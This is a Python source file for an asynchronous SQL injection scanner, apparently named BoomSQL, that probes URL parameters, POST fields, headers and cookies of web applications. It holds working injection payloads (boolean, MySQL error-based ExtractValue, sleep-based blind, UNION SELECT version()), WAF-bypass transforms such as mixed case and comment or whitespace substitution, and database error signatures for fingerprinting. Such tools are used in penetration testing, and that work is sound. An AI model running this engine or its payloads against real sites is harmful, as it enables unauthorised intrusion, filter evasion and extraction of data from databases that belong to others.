"""
SQL Injection Engine for BoomSQL
Advanced SQL injection detection and exploitation engine
"""

import asyncio
import aiohttp
import re
import time
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime, timedelta
from pathlib import Path
import json
import base64
import html
import urllib.parse
from dataclasses import dataclass
from enum import Enum

from .logger import LoggerMixin

class InjectionType(Enum):
    """SQL injection types"""
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    STACKED_QUERIES = "stacked_queries"
    OUT_OF_BAND = "out_of_band"
    CONTENT_LENGTH = "content_length"
    HEADER_BASED = "header_based"
    COOKIE_BASED = "cookie_based"
    SECOND_ORDER = "second_order"
    MULTIPLE_BLIND = "multiple_blind"
    RESPONSE_TIME = "response_time"
    JSON_INJECTION = "json_injection"

class InjectionVector(Enum):
    """Injection vectors"""
    GET_PARAMETER = "get_parameter"
    POST_PARAMETER = "post_parameter"
    HEADER = "header"
    COOKIE = "cookie"
    URL_PATH = "url_path"
    JSON_PARAMETER = "json_parameter"
    XML_PARAMETER = "xml_parameter"

class DatabaseType(Enum):
    """Supported database types"""
    MYSQL = "mysql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    POSTGRESQL = "postgresql"
    SQLITE = "sqlite"
    MONGODB = "mongodb"
    DB2 = "db2"
    FIREBIRD = "firebird"
    SYBASE = "sybase"
    INFORMIX = "informix"
    MARIADB = "mariadb"
    ACCESS = "access"
    UNKNOWN = "unknown"

@dataclass
class SqlPayload:
    """SQL injection payload"""
    title: str
    payload: str
    risk: int
    platform: str
    category: str
    injection_type: InjectionType
    description: str = ""
    encoded_variants: List[str] = None

@dataclass
class ErrorSignature:
    """Database error signature"""
    database: DatabaseType
    patterns: List[str]
    severity: str
    description: str = ""

@dataclass
class WafBypass:
    """WAF bypass technique"""
    title: str
    category: str
    description: str
    transform_function: str
    examples: List[str] = None

@dataclass
class InjectionPoint:
    """SQL injection point"""
    vector: InjectionVector
    name: str
    value: str
    original_value: str = ""
    is_vulnerable: bool = False

@dataclass
class VulnerabilityResult:
    """Vulnerability test result"""
    url: str
    injection_point: InjectionPoint
    payload: SqlPayload
    injection_type: InjectionType
    database_type: DatabaseType
    confidence: float
    response_time: float
    evidence: str
    response_code: int
    response_headers: Dict[str, str]
    response_body: str
    bypass_method: str = ""
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()

@dataclass
class TestResult:
    """Complete test result"""
    url: str
    vulnerabilities: List[VulnerabilityResult]
    total_payloads_tested: int
    total_time: float
    errors: List[str]
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()
            
    @property
    def is_vulnerable(self) -> bool:
        return len(self.vulnerabilities) > 0
        
    @property
    def highest_confidence(self) -> float:
        return max([v.confidence for v in self.vulnerabilities], default=0.0)

class SqlInjectionEngine(LoggerMixin):
    """Advanced SQL injection detection engine"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.payloads: List[SqlPayload] = []
        self.error_signatures: List[ErrorSignature] = []
        self.waf_bypasses: List[WafBypass] = []
        self.session = None
        self.baseline_responses: Dict[str, Dict] = {}
        
        # Load data files
        self.load_payloads()
        self.load_error_signatures()
        self.load_waf_bypasses()
        
        # Initialize session
        self.init_session()
        
    def init_session(self):
        """Initialize aiohttp session"""
        timeout = aiohttp.ClientTimeout(total=self.config.get("RequestTimeout", 30))
        connector = aiohttp.TCPConnector(
            limit=self.config.get("MaxThreads", 5),
            ssl=False if not self.config.get("EnableSslCertificateValidation", False) else None
        )
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': self.config.get("UserAgent", "BoomSQL/2.0"),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
        )
        
    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()
            
    def load_payloads(self):
        """Load SQL injection payloads from XML file"""
        try:
            payload_file = Path(self.config.get("PayloadFile", "payloads.xml"))
            if not payload_file.exists():
                self.log_warning(f"Payload file not found: {payload_file}")
                self.payloads = self.get_default_payloads()
                return
                
            tree = ET.parse(payload_file)
            root = tree.getroot()
            
            for payload_elem in root.findall("payload"):
                payload = SqlPayload(
                    title=payload_elem.get("title", "Unknown"),
                    payload=payload_elem.text or "",
                    risk=int(payload_elem.get("risk", "1")),
                    platform=payload_elem.get("platform", "generic"),
                    category=payload_elem.get("category", "generic"),
                    injection_type=self.get_injection_type(payload_elem.get("category", "generic")),
                    description=payload_elem.get("description", "")
                )
                self.payloads.append(payload)
                
            self.log_info(f"Loaded {len(self.payloads)} payloads")
            
        except Exception as e:
            self.log_error(f"Error loading payloads: {e}")
            self.payloads = self.get_default_payloads()
            
    def load_error_signatures(self):
        """Load database error signatures from XML file"""
        try:
            signature_file = Path(self.config.get("ErrorSignatureFile", "error_signatures.xml"))
            if not signature_file.exists():
                self.log_warning(f"Error signature file not found: {signature_file}")
                self.error_signatures = self.get_default_error_signatures()
                return
                
            tree = ET.parse(signature_file)
            root = tree.getroot()
            
            for sig_elem in root.findall("signature"):
                patterns = [p.text for p in sig_elem.findall("pattern") if p.text]
                
                signature = ErrorSignature(
                    database=DatabaseType(sig_elem.get("database", "unknown")),
                    patterns=patterns,
                    severity=sig_elem.get("severity", "medium"),
                    description=sig_elem.get("description", "")
                )
                self.error_signatures.append(signature)
                
            self.log_info(f"Loaded {len(self.error_signatures)} error signatures")
            
        except Exception as e:
            self.log_error(f"Error loading error signatures: {e}")
            self.error_signatures = self.get_default_error_signatures()
            
    def load_waf_bypasses(self):
        """Load WAF bypass techniques from XML file"""
        try:
            bypass_file = Path(self.config.get("WafBypassFile", "waf_bypasses.xml"))
            if not bypass_file.exists():
                self.log_warning(f"WAF bypass file not found: {bypass_file}")
                self.waf_bypasses = self.get_default_waf_bypasses()
                return
                
            tree = ET.parse(bypass_file)
            root = tree.getroot()
            
            for bypass_elem in root.findall("bypass"):
                bypass = WafBypass(
                    title=bypass_elem.get("title", "Unknown"),
                    category=bypass_elem.get("category", "generic"),
                    description=bypass_elem.findtext("description", ""),
                    transform_function=bypass_elem.findtext("script", ""),
                    examples=[e.text for e in bypass_elem.findall("example") if e.text]
                )
                self.waf_bypasses.append(bypass)
                
            self.log_info(f"Loaded {len(self.waf_bypasses)} WAF bypasses")
            
        except Exception as e:
            self.log_error(f"Error loading WAF bypasses: {e}")
            self.waf_bypasses = self.get_default_waf_bypasses()
            
    def get_injection_type(self, category: str) -> InjectionType:
        """Map category to injection type"""
        mapping = {
            "error": InjectionType.ERROR_BASED,
            "boolean": InjectionType.BOOLEAN_BASED,
            "time": InjectionType.TIME_BASED,
            "union": InjectionType.UNION_BASED,
            "stacked": InjectionType.STACKED_QUERIES,
            "outofband": InjectionType.OUT_OF_BAND,
            "secondorder": InjectionType.SECOND_ORDER,
            "header": InjectionType.HEADER_BASED,
            "cookie": InjectionType.COOKIE_BASED,
            "json": InjectionType.JSON_INJECTION
        }
        return mapping.get(category, InjectionType.ERROR_BASED)
        
    async def test_url(self, url: str, method: str = "GET", data: Dict = None, 
                      headers: Dict = None, cookies: Dict = None) -> TestResult:
        """Test URL for SQL injection vulnerabilities"""
        self.log_info(f"Testing URL: {url}")
        start_time = time.time()
        
        vulnerabilities = []
        errors = []
        payloads_tested = 0
        
        try:
            # Get baseline response
            baseline = await self.get_baseline_response(url, method, data, headers, cookies)
            
            # Find injection points
            injection_points = self.find_injection_points(url, method, data, headers, cookies)
            
            # Test each injection point
            for injection_point in injection_points:
                for payload in self.payloads:
                    if payloads_tested >= self.config.get("MaxPayloadsPerUrl", 100):
                        break
                        
                    try:
                        # Test original payload
                        result = await self.test_payload(
                            url, method, injection_point, payload, baseline, data, headers, cookies
                        )
                        
                        if result:
                            vulnerabilities.append(result)
                            
                        payloads_tested += 1
                        
                        # Test with WAF bypasses if enabled
                        if self.config.get("EnableWafBypasses", True):
                            for bypass in self.waf_bypasses:
                                bypassed_payload = self.apply_waf_bypass(payload, bypass)
                                bypass_result = await self.test_payload(
                                    url, method, injection_point, bypassed_payload, baseline, 
                                    data, headers, cookies
                                )
                                
                                if bypass_result:
                                    bypass_result.bypass_method = bypass.title
                                    vulnerabilities.append(bypass_result)
                                    
                                payloads_tested += 1
                                
                        # Add delay between requests
                        await asyncio.sleep(self.config.get("RequestDelay", 1000) / 1000)
                        
                    except Exception as e:
                        errors.append(f"Error testing payload '{payload.title}': {str(e)}")
                        
        except Exception as e:
            errors.append(f"Error during testing: {str(e)}")
            
        total_time = time.time() - start_time
        
        return TestResult(
            url=url,
            vulnerabilities=vulnerabilities,
            total_payloads_tested=payloads_tested,
            total_time=total_time,
            errors=errors
        )
        
    async def get_baseline_response(self, url: str, method: str, data: Dict = None, 
                                   headers: Dict = None, cookies: Dict = None) -> Dict:
        """Get baseline response for comparison"""
        try:
            if method.upper() == "GET":
                async with self.session.get(url, headers=headers, cookies=cookies) as response:
                    content = await response.text()
                    return {
                        "status": response.status,
                        "headers": dict(response.headers),
                        "content": content,
                        "content_length": len(content),
                        "response_time": response.headers.get("response-time", 0)
                    }
            else:
                async with self.session.post(url, data=data, headers=headers, cookies=cookies) as response:
                    content = await response.text()
                    return {
                        "status": response.status,
                        "headers": dict(response.headers),
                        "content": content,
                        "content_length": len(content),
                        "response_time": response.headers.get("response-time", 0)
                    }
        except Exception as e:
            self.log_error(f"Error getting baseline response: {e}")
            return {}
            
    def find_injection_points(self, url: str, method: str, data: Dict = None, 
                            headers: Dict = None, cookies: Dict = None) -> List[InjectionPoint]:
        """Find potential injection points in the request"""
        injection_points = []
        
        # Parse URL for GET parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param, values in params.items():
                if values:
                    injection_points.append(InjectionPoint(
                        vector=InjectionVector.GET_PARAMETER,
                        name=param,
                        value=values[0],
                        original_value=values[0]
                    ))
        
        # POST parameters
        if method.upper() == "POST" and data:
            for param, value in data.items():
                injection_points.append(InjectionPoint(
                    vector=InjectionVector.POST_PARAMETER,
                    name=param,
                    value=str(value),
                    original_value=str(value)
                ))
        
        # Headers
        if headers:
            for header, value in headers.items():
                if header.lower() in ['user-agent', 'referer', 'x-forwarded-for', 'x-real-ip']:
                    injection_points.append(InjectionPoint(
                        vector=InjectionVector.HEADER,
                        name=header,
                        value=str(value),
                        original_value=str(value)
                    ))
        
        # Cookies
        if cookies:
            for cookie, value in cookies.items():
                injection_points.append(InjectionPoint(
                    vector=InjectionVector.COOKIE,
                    name=cookie,
                    value=str(value),
                    original_value=str(value)
                ))
        
        return injection_points
        
    async def test_payload(self, url: str, method: str, injection_point: InjectionPoint, 
                          payload: SqlPayload, baseline: Dict, data: Dict = None, 
                          headers: Dict = None, cookies: Dict = None) -> Optional[VulnerabilityResult]:
        """Test a specific payload at an injection point"""
        try:
            # Prepare modified request
            modified_url, modified_data, modified_headers, modified_cookies = self.prepare_request(
                url, method, injection_point, payload, data, headers, cookies
            )
            
            # Execute request
            start_time = time.time()
            
            if method.upper() == "GET":
                async with self.session.get(modified_url, headers=modified_headers, cookies=modified_cookies) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    # Analyze response
                    detection_result = self.analyze_response(
                        response, content, response_time, payload, baseline
                    )
                    
                    if detection_result:
                        return VulnerabilityResult(
                            url=url,
                            injection_point=injection_point,
                            payload=payload,
                            injection_type=payload.injection_type,
                            database_type=detection_result["database_type"],
                            confidence=detection_result["confidence"],
                            response_time=response_time,
                            evidence=detection_result["evidence"],
                            response_code=response.status,
                            response_headers=dict(response.headers),
                            response_body=content[:1000]  # Limit response body size
                        )
            else:
                async with self.session.post(modified_url, data=modified_data, headers=modified_headers, cookies=modified_cookies) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    # Analyze response
                    detection_result = self.analyze_response(
                        response, content, response_time, payload, baseline
                    )
                    
                    if detection_result:
                        return VulnerabilityResult(
                            url=url,
                            injection_point=injection_point,
                            payload=payload,
                            injection_type=payload.injection_type,
                            database_type=detection_result["database_type"],
                            confidence=detection_result["confidence"],
                            response_time=response_time,
                            evidence=detection_result["evidence"],
                            response_code=response.status,
                            response_headers=dict(response.headers),
                            response_body=content[:1000]
                        )
                        
        except Exception as e:
            self.log_error(f"Error testing payload: {e}")
            
        return None
        
    def prepare_request(self, url: str, method: str, injection_point: InjectionPoint, 
                       payload: SqlPayload, data: Dict = None, headers: Dict = None, 
                       cookies: Dict = None) -> Tuple[str, Dict, Dict, Dict]:
        """Prepare request with injected payload"""
        modified_url = url
        modified_data = data.copy() if data else {}
        modified_headers = headers.copy() if headers else {}
        modified_cookies = cookies.copy() if cookies else {}
        
        if injection_point.vector == InjectionVector.GET_PARAMETER:
            # Modify URL parameter
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[injection_point.name] = [payload.payload]
            query_string = urlencode(params, doseq=True)
            modified_url = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, query_string, parsed_url.fragment
            ))
            
        elif injection_point.vector == InjectionVector.POST_PARAMETER:
            # Modify POST data
            modified_data[injection_point.name] = payload.payload
            
        elif injection_point.vector == InjectionVector.HEADER:
            # Modify header
            modified_headers[injection_point.name] = payload.payload
            
        elif injection_point.vector == InjectionVector.COOKIE:
            # Modify cookie
            modified_cookies[injection_point.name] = payload.payload
            
        return modified_url, modified_data, modified_headers, modified_cookies
        
    def analyze_response(self, response, content: str, response_time: float, 
                        payload: SqlPayload, baseline: Dict) -> Optional[Dict]:
        """Analyze response for SQL injection indicators"""
        
        # Error-based detection
        if payload.injection_type == InjectionType.ERROR_BASED:
            error_result = self.detect_error_based(content)
            if error_result:
                return error_result
                
        # Time-based detection
        if payload.injection_type == InjectionType.TIME_BASED:
            time_result = self.detect_time_based(response_time, payload)
            if time_result:
                return time_result
                
        # Boolean-based detection
        if payload.injection_type == InjectionType.BOOLEAN_BASED:
            boolean_result = self.detect_boolean_based(content, response.status, baseline)
            if boolean_result:
                return boolean_result
                
        # Union-based detection
        if payload.injection_type == InjectionType.UNION_BASED:
            union_result = self.detect_union_based(content)
            if union_result:
                return union_result
                
        # Content-length based detection
        content_length_result = self.detect_content_length_based(len(content), baseline)
        if content_length_result:
            return content_length_result
            
        return None
        
    def detect_error_based(self, content: str) -> Optional[Dict]:
        """Detect error-based SQL injection"""
        for signature in self.error_signatures:
            for pattern in signature.patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    confidence = 0.95 if signature.severity == "high" else 0.75
                    return {
                        "database_type": signature.database,
                        "confidence": confidence,
                        "evidence": f"Error pattern matched: {pattern}"
                    }
        return None
        
    def detect_time_based(self, response_time: float, payload: SqlPayload) -> Optional[Dict]:
        """Detect time-based SQL injection"""
        threshold = self.config.get("TimeBasedThreshold", 3.0)
        
        if response_time >= threshold:
            return {
                "database_type": DatabaseType.UNKNOWN,
                "confidence": 0.8,
                "evidence": f"Response time: {response_time:.2f}s (threshold: {threshold}s)"
            }
        return None
        
    def detect_boolean_based(self, content: str, status_code: int, baseline: Dict) -> Optional[Dict]:
        """Detect boolean-based SQL injection"""
        # This is a simplified implementation
        # In practice, you'd need to compare with true/false conditions
        
        if not baseline:
            return None
            
        baseline_length = baseline.get("content_length", 0)
        current_length = len(content)
        
        # Significant difference in content length
        if abs(current_length - baseline_length) > 100:
            return {
                "database_type": DatabaseType.UNKNOWN,
                "confidence": 0.6,
                "evidence": f"Content length difference: {current_length} vs {baseline_length}"
            }
            
        return None
        
    def detect_union_based(self, content: str) -> Optional[Dict]:
        """Detect union-based SQL injection"""
        union_patterns = [
            r'\b\d+\b.*\b\d+\b.*\b\d+\b',  # Numbers pattern
            r'version\(\)',  # MySQL version
            r'@@version',  # SQL Server version
            r'user\(\)',  # MySQL user
            r'database\(\)',  # MySQL database
            r'schema\(\)',  # Schema
            r'table_name',  # Information schema
            r'column_name'  # Information schema
        ]
        
        for pattern in union_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return {
                    "database_type": DatabaseType.UNKNOWN,
                    "confidence": 0.85,
                    "evidence": f"Union-based indicator: {pattern}"
                }
        return None
        
    def detect_content_length_based(self, content_length: int, baseline: Dict) -> Optional[Dict]:
        """Detect content-length based SQL injection"""
        if not baseline:
            return None
            
        baseline_length = baseline.get("content_length", 0)
        
        # Significant difference in content length
        if baseline_length > 0 and abs(content_length - baseline_length) > 200:
            return {
                "database_type": DatabaseType.UNKNOWN,
                "confidence": 0.4,
                "evidence": f"Content length difference: {content_length} vs {baseline_length}"
            }
        return None
        
    def apply_waf_bypass(self, payload: SqlPayload, bypass: WafBypass) -> SqlPayload:
        """Apply WAF bypass technique to payload"""
        bypassed_payload = payload.payload
        
        # Apply bypass based on category
        if bypass.category == "url_encoding":
            bypassed_payload = urllib.parse.quote(bypassed_payload)
        elif bypass.category == "html_encoding":
            bypassed_payload = html.escape(bypassed_payload)
        elif bypass.category == "base64_encoding":
            bypassed_payload = base64.b64encode(bypassed_payload.encode()).decode()
        elif bypass.category == "case_manipulation":
            bypassed_payload = self.apply_case_manipulation(bypassed_payload)
        elif bypass.category == "comment_injection":
            bypassed_payload = bypassed_payload.replace(" ", "/**/")
        elif bypass.category == "whitespace_manipulation":
            bypassed_payload = bypassed_payload.replace(" ", "\t")
        # Add more bypass techniques as needed
        
        return SqlPayload(
            title=f"{payload.title} (WAF Bypass: {bypass.title})",
            payload=bypassed_payload,
            risk=payload.risk,
            platform=payload.platform,
            category=payload.category,
            injection_type=payload.injection_type,
            description=f"WAF bypassed version of {payload.title}"
        )
        
    def apply_case_manipulation(self, payload: str) -> str:
        """Apply case manipulation bypass"""
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                result += char.upper() if i % 2 == 0 else char.lower()
            else:
                result += char
        return result
        
    def get_default_payloads(self) -> List[SqlPayload]:
        """Get default payloads if XML file is not available"""
        return [
            SqlPayload(
                title="Generic Boolean-based",
                payload="' OR 1=1 --",
                risk=3,
                platform="generic",
                category="boolean",
                injection_type=InjectionType.BOOLEAN_BASED,
                description="Generic boolean-based SQL injection"
            ),
            SqlPayload(
                title="MySQL Error-based",
                payload="' AND ExtractValue(1, concat(0x7e, version(), 0x7e)) --",
                risk=4,
                platform="mysql",
                category="error",
                injection_type=InjectionType.ERROR_BASED,
                description="MySQL error-based extraction"
            ),
            SqlPayload(
                title="Time-based Blind",
                payload="' AND sleep(5) --",
                risk=3,
                platform="mysql",
                category="time",
                injection_type=InjectionType.TIME_BASED,
                description="MySQL time-based blind injection"
            ),
            SqlPayload(
                title="UNION-based",
                payload="' UNION SELECT 1,2,3,version(),5 --",
                risk=4,
                platform="mysql",
                category="union",
                injection_type=InjectionType.UNION_BASED,
                description="MySQL UNION-based injection"
            )
        ]
        
    def get_default_error_signatures(self) -> List[ErrorSignature]:
        """Get default error signatures if XML file is not available"""
        return [
            ErrorSignature(
                database=DatabaseType.MYSQL,
                patterns=[
                    "You have an error in your SQL syntax",
                    "Warning: mysql_",
                    "MySQLSyntaxErrorException",
                    "mysql_num_rows()",
                    "mysql_error()"
                ],
                severity="high",
                description="MySQL error signatures"
            ),
            ErrorSignature(
                database=DatabaseType.MSSQL,
                patterns=[
                    "Microsoft SQL Server",
                    "Incorrect syntax near",
                    "System.Data.SqlClient.SqlException",
                    "SqlException"
                ],
                severity="high",
                description="Microsoft SQL Server error signatures"
            ),
            ErrorSignature(
                database=DatabaseType.POSTGRESQL,
                patterns=[
                    "PostgreSQL query failed",
                    "pg_query()",
                    "pg_exec()",
                    "PostgreSQL"
                ],
                severity="high",
                description="PostgreSQL error signatures"
            )
        ]
        
    def get_default_waf_bypasses(self) -> List[WafBypass]:
        """Get default WAF bypasses if XML file is not available"""
        return [
            WafBypass(
                title="URL Encoding",
                category="url_encoding",
                description="Apply URL encoding to bypass WAF",
                transform_function="urllib.parse.quote"
            ),
            WafBypass(
                title="Case Manipulation",
                category="case_manipulation",
                description="Apply mixed case to bypass WAF",
                transform_function="mixed_case"
            ),
            WafBypass(
                title="Comment Injection",
                category="comment_injection",
                description="Inject MySQL comments to bypass WAF",
                transform_function="comment_injection"
            ),
            WafBypass(
                title="Whitespace Manipulation",
                category="whitespace_manipulation",
                description="Replace spaces with tabs or other whitespace",
                transform_function="whitespace_manipulation"
            )
        ]